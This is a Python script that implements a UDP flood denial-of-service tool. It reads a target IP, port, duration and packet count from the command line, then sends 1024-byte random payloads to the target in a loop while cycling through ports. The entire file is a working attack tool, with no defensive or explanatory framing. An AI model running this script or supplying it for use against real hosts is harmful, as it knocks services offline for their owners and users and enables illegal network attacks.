import random
import sys
import os
import socket
import time

# os.system("cls")
# port = 1
# ip = input("\nenter IP: ")
# dur = int(input("\nenter Duration:"))
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def assign_args():
    ip = str(sys.argv[1])
    port = int(sys.argv[2])
    duration = float(sys.argv[3])
    packets = int(sys.argv[4])

    return ip, port, duration, packets


def UDP_flood(ip, port, duration, packets):
    sent = int(0)
    bytes = os.urandom(1024)

    timeout = time.time() + duration
    while 1 == 1:
        try:
            if time.time() > timeout or packets == sent:
                sys.exit()
            else:
                socket.sendto(bytes, (ip, port))
                sent = sent + 1
                if port == 65535:
                    port = 1
                else:
                    port = port + 1
                    print(sent, ip, port)
        except KeyboardInterrupt:
            sys.exit()


def main():
    ip, port, duration, packets = assign_args()
    UDP_flood(ip=ip, port=port, duration=duration, packets=packets)


if __name__ == "__main__":
    main()
